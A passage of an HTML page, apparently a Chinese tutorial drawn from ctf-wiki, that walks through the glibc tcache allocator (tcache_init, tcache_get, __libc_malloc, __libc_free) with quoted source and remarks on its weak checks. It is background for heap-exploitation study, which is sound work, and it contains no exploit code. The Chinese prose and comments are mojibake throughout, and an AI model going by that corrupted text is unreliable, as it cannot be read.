directive-hash\">#</span> <span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">TCACHE_MAX_BINS</span>                <span class=\"token expression\"><span class=\"token number\">64</span></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">static</span> __thread tcache_perthread_struct <span class=\"token operator\">*</span>tcache <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>ÊØè‰∏™ thread ÈÉΩ‰ºöÁª¥Êä§‰∏Ä‰∏™  <code>tcache_perthread_struct</code> ÔºåÂÆÉÊòØÊï¥‰∏™ tcache ÁöÑÁÆ°ÁêÜÁªìÊûÑÔºå‰∏ÄÂÖ±Êúâ  <code>TCACHE_MAX_BINS</code>  ‰∏™ËÆ°Êï∞Âô®Âíå  <code>TCACHE_MAX_BINS</code>  È°π tcache_entryÔºåÂÖ∂‰∏≠</p>\n<ul>\n<li><code>tcache_entry</code>  Áî®ÂçïÂêëÈìæË°®ÁöÑÊñπÂºèÈìæÊé•‰∫ÜÁõ∏ÂêåÂ§ßÂ∞èÁöÑÂ§Ñ‰∫éÁ©∫Èó≤Áä∂ÊÄÅÔºàfree ÂêéÔºâÁöÑ chunkÔºåËøô‰∏ÄÁÇπ‰∏äÂíå fastbin ÂæàÂÉè„ÄÇ</li>\n<li><code>counts</code>  ËÆ∞ÂΩï‰∫Ü  <code>tcache_entry</code>  Èìæ‰∏äÁ©∫Èó≤ chunk ÁöÑÊï∞ÁõÆÔºåÊØèÊù°Èìæ‰∏äÊúÄÂ§öÂèØ‰ª•Êúâ 7 ‰∏™ chunk„ÄÇ</li>\n</ul>\n<p>Áî®ÂõæË°®Á§∫Â§ßÊ¶ÇÊòØÔºö</p>\n<p>Âü∫Êú¨Â∑•‰ΩúÊñπÂºè <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI18y\">¬∂</span></p>\n<ul>\n<li>Á¨¨‰∏ÄÊ¨° malloc Êó∂Ôºå‰ºöÂÖà malloc ‰∏ÄÂùóÂÜÖÂ≠òÁî®Êù•Â≠òÊîæ  <code>tcache_perthread_struct</code>  „ÄÇ</li>\n<li>free ÂÜÖÂ≠òÔºå‰∏î size Â∞è‰∫é small bin size Êó∂</li>\n<li>tcache ‰πãÂâç‰ºöÊîæÂà∞ fastbin ÊàñËÄÖ unsorted bin ‰∏≠</li>\n<li>tcache ÂêéÔºö\n<ul>\n<li>ÂÖàÊîæÂà∞ÂØπÂ∫îÁöÑ tcache ‰∏≠ÔºåÁõ¥Âà∞ tcache Ë¢´Â°´Êª°ÔºàÈªòËÆ§ÊòØ 7 ‰∏™Ôºâ</li>\n<li>tcache Ë¢´Â°´Êª°‰πãÂêéÔºåÂÜçÊ¨° free ÁöÑÂÜÖÂ≠òÂíå‰πãÂâç‰∏ÄÊ†∑Ë¢´ÊîæÂà∞ fastbin ÊàñËÄÖ unsorted bin ‰∏≠</li>\n<li>tcache ‰∏≠ÁöÑ chunk ‰∏ç‰ºöÂêàÂπ∂Ôºà‰∏çÂèñÊ∂à inuse bitÔºâ</li>\n</ul>\n</li>\n<li>malloc ÂÜÖÂ≠òÔºå‰∏î size Âú® tcache ËåÉÂõ¥ÂÜÖ</li>\n<li>ÂÖà‰ªé tcache Âèñ chunkÔºåÁõ¥Âà∞ tcache ‰∏∫Á©∫</li>\n<li>tcache ‰∏∫Á©∫ÂêéÔºå‰ªé bin ‰∏≠Êâæ</li>\n<li>tcache ‰∏∫Á©∫Êó∂ÔºåÂ¶ÇÊûú  <code>fastbin/smallbin/unsorted bin</code>  ‰∏≠Êúâ size Á¨¶ÂêàÁöÑ chunkÔºå‰ºöÂÖàÊää  <code>fastbin/smallbin/unsorted bin</code>  ‰∏≠ÁöÑ chunk ÊîæÂà∞ tcache ‰∏≠ÔºåÁõ¥Âà∞Â°´Êª°„ÄÇ‰πãÂêéÂÜç‰ªé tcache ‰∏≠ÂèñÔºõÂõ†Ê≠§ chunk Âú® bin ‰∏≠Âíå tcache ‰∏≠ÁöÑÈ°∫Â∫è‰ºöÂèçËøáÊù•</li>\n</ul>\n<p>Ê∫êÁ†ÅÂàÜÊûê <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI18z\">¬∂</span></p>\n<p>Êé•‰∏ãÊù•‰ªéÊ∫êÁ†ÅÁöÑËßíÂ∫¶ÂàÜÊûê‰∏Ä‰∏ã tcache„ÄÇ</p>\n<p>libc_malloc<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI19fbGliY19tYWxsb2M=\">¬∂</span></p>\n<p>Á¨¨‰∏ÄÊ¨° malloc Êó∂Ôºå‰ºöËøõÂÖ•Âà∞  <code>MAYBE_INIT_TCACHE ()</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjMzAxMA==\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">__libc_malloc</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span> bytes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\">USE_TCACHE</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token comment\">/* int_free also calls request2size, be careful to not pad twice.  */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token class-name\">size_t</span> tbytes<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\">// Ê†πÊçÆ malloc ‰º†ÂÖ•ÁöÑÂèÇÊï∞ËÆ°ÁÆó chunk ÂÆûÈôÖÂ§ßÂ∞èÔºåÂπ∂ËÆ°ÁÆó tcache ÂØπÂ∫îÁöÑ‰∏ãÊ†á</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">checked_request2size</span> <span class=\"token punctuation\">(</span>bytes<span class=\"token punctuation\">,</span> tbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token class-name\">size_t</span> tc_idx <span class=\"token operator\">=</span> <span class=\"token function\">csize2tidx</span> <span class=\"token punctuation\">(</span>tbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token comment\">// ÂàùÂßãÂåñ tcache</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">MAYBE_INIT_TCACHE</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  DIAG_PUSH_NEEDS_COMMENT<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tc_idx <span class=\"token operator\">&lt;</span> mp_<span class=\"token punctuation\">.</span>tcache_bins  <span class=\"token comment\">// Ê†πÊçÆ size ÂæóÂà∞ÁöÑ idx Âú®ÂêàÊ≥ïÁöÑËåÉÂõ¥ÂÜÖ</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token comment\">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class=\"token comment\">/* to appease gcc */</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token operator\">&amp;&amp;</span> tcache</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token operator\">&amp;&amp;</span> tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//tcache->entries [tc_idx] Êúâ chunk</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token function\">tcache_get</span> <span class=\"token punctuation\">(</span>tc_idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  DIAG_POP_NEEDS_COMMENT<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>tcache_init()<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI19fdGNhY2hlX2luaXQ=\">¬∂</span></p>\n<p>ÂÖ∂‰∏≠  <code>MAYBE_INIT_TCACHE ()</code>  Âú® tcache ‰∏∫Á©∫ÔºàÂç≥Á¨¨‰∏ÄÊ¨° mallocÔºâÊó∂Ë∞ÉÁî®‰∫Ü  <code>tcache_init()</code> ÔºåÁõ¥Êé•Êü•Áúã  <code>tcache_init()</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjdGNhY2hlX2luaXQ=\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">tcache_init</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  mstate ar_ptr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>victim <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">const</span> <span class=\"token class-name\">size_t</span> bytes <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span> <span class=\"token punctuation\">(</span>tcache_perthread_struct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tcache_shutting_down<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">arena_get</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ÊâæÂà∞ÂèØÁî®ÁöÑ arena</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  victim <span class=\"token operator\">=</span> <span class=\"token function\">_int_malloc</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Áî≥ËØ∑‰∏Ä‰∏™ sizeof (tcache_perthread_struct) Â§ßÂ∞èÁöÑ chunk</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>victim <span class=\"token operator\">&amp;&amp;</span> ar_ptr <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      ar_ptr <span class=\"token operator\">=</span> <span class=\"token function\">arena_get_retry</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      victim <span class=\"token operator\">=</span> <span class=\"token function\">_int_malloc</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ar_ptr <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token function\">__libc_lock_unlock</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token operator\">-></span>mutex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token comment\">/* In a low memory situation, we may not be able to allocate memory</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>     - in which case, we just keep trying later.  However, we</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>     typically do this very early, so either there is sufficient</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>     memory, or there isn't enough memory to do non-trivial</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>     allocations anyway.  */</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span> <span class=\"token comment\">// ÂàùÂßãÂåñ tcache</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      tcache <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>tcache_perthread_struct <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> victim<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token function\">memset</span> <span class=\"token punctuation\">(</span>tcache<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span> <span class=\"token punctuation\">(</span>tcache_perthread_struct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>tcache_init()</code>  ÊàêÂäüËøîÂõûÂêéÔºå <code>tcache_perthread_struct</code>  Â∞±Ë¢´ÊàêÂäüÂª∫Á´ã‰∫Ü„ÄÇ</p>\n<p>Áî≥ËØ∑ÂÜÖÂ≠ò <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI180\">¬∂</span></p>\n<p>Êé•‰∏ãÊù•Â∞ÜËøõÂÖ•Áî≥ËØ∑ÂÜÖÂ≠òÁöÑÊ≠•È™§</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// ‰ªé tcache list ‰∏≠Ëé∑ÂèñÂÜÖÂ≠ò</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tc_idx <span class=\"token operator\">&lt;</span> mp_<span class=\"token punctuation\">.</span>tcache_bins <span class=\"token comment\">// Áî± size ËÆ°ÁÆóÁöÑ idx Âú®ÂêàÊ≥ïËåÉÂõ¥ÂÜÖ</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token comment\">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class=\"token comment\">/* to appease gcc */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token operator\">&amp;&amp;</span> tcache</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token operator\">&amp;&amp;</span> tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// ËØ•Êù° tcache Èìæ‰∏ç‰∏∫Á©∫</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token function\">tcache_get</span> <span class=\"token punctuation\">(</span>tc_idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  DIAG_POP_NEEDS_COMMENT<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token comment\">// ËøõÂÖ•‰∏éÊó† tcache Êó∂Á±ª‰ººÁöÑÊµÅÁ®ã</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>SINGLE_THREAD_P<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      victim <span class=\"token operator\">=</span> <span class=\"token function\">_int_malloc</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>main_arena<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token function\">assert</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>victim <span class=\"token operator\">||</span> <span class=\"token function\">chunk_is_mmapped</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mem2chunk</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>              <span class=\"token operator\">&amp;</span>main_arena <span class=\"token operator\">==</span> <span class=\"token function\">arena_for_chunk</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mem2chunk</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">return</span> victim<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>Âú®  <code>tcache-&gt;entries</code>  ‰∏ç‰∏∫Á©∫Êó∂ÔºåÂ∞ÜËøõÂÖ•  <code>tcache_get()</code>  ÁöÑÊµÅÁ®ãËé∑Âèñ chunkÔºåÂê¶Âàô‰∏é tcache Êú∫Âà∂ÂâçÁöÑÊµÅÁ®ãÁ±ª‰ººÔºåËøôÈáå‰∏ªË¶ÅÂàÜÊûêÁ¨¨‰∏ÄÁßç  <code>tcache_get()</code> „ÄÇËøôÈáå‰πüÂèØ‰ª•ÁúãÂá∫ tcache ÁöÑ‰ºòÂÖàÁ∫ßÂæàÈ´òÔºåÊØî fastbin ËøòË¶ÅÈ´òÔºà fastbin ÁöÑÁî≥ËØ∑Âú®Ê≤°ËøõÂÖ• tcache ÁöÑÊµÅÁ®ã‰∏≠Ôºâ„ÄÇ</p>\n<p>tcache_get()<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI3RjYWNoZV9nZXQ=\">¬∂</span></p>\n<p>Áúã‰∏Ä‰∏ã  <code>tcache_get()</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjdGNhY2hlX2dldA==\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* Caller must ensure that we know tc_idx is valid and there's</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   available chunks to remove.  */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">static</span> __always_inline <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">tcache_get</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span> tc_idx<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  tcache_entry <span class=\"token operator\">*</span>e <span class=\"token operator\">=</span> tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">assert</span> <span class=\"token punctuation\">(</span>tc_idx <span class=\"token operator\">&lt;</span> TCACHE_MAX_BINS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">assert</span> <span class=\"token punctuation\">(</span>tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> e<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token operator\">--</span><span class=\"token punctuation\">(</span>tcache<span class=\"token operator\">-></span>counts<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Ëé∑Âæó‰∏Ä‰∏™ chunkÔºåcounts Âáè‰∏Ä</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> e<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>tcache_get()</code>  Â∞±ÊòØËé∑Âæó chunk ÁöÑËøáÁ®ã‰∫Ü„ÄÇÂèØ‰ª•ÁúãÂá∫Ëøô‰∏™ËøáÁ®ãËøòÊòØÂæàÁÆÄÂçïÁöÑÔºå‰ªé  <code>tcache-&gt;entries[tc_idx]</code>  ‰∏≠Ëé∑ÂæóÁ¨¨‰∏Ä‰∏™ chunkÔºå <code>tcache-&gt;counts</code>  Âáè‰∏ÄÔºåÂá†‰πéÊ≤°Êúâ‰ªª‰Ωï‰øùÊä§„ÄÇ</p>\n<p>libc_free()<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI19fbGliY19mcmVl\">¬∂</span></p>\n<p>ÁúãÂÆåÁî≥ËØ∑ÔºåÂÜçÁúãÁúãÊúâ tcache Êó∂ÁöÑÈáäÊîæ</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjMzA2OA==\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">__libc_free</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>mem<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">MAYBE_INIT_TCACHE</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  ar_ptr <span class=\"token operator\">=</span> <span class=\"token function\">arena_for_chunk</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">_int_free</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>__libc_free()</code>  Ê≤°ÊúâÂ§™Â§öÂèòÂåñÔºå <code>MAYBE_INIT_TCACHE ()</code>  Âú® tcache ‰∏ç‰∏∫Á©∫Â§±Âéª‰∫Ü‰ΩúÁî®„ÄÇ</p>\n<p>int_free()<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI19pbnRfZnJlZQ==\">¬∂</span></p>\n<p>Ë∑üËøõ  <code>_int_free()</code></p>\n<p><span class=\"exturl\" 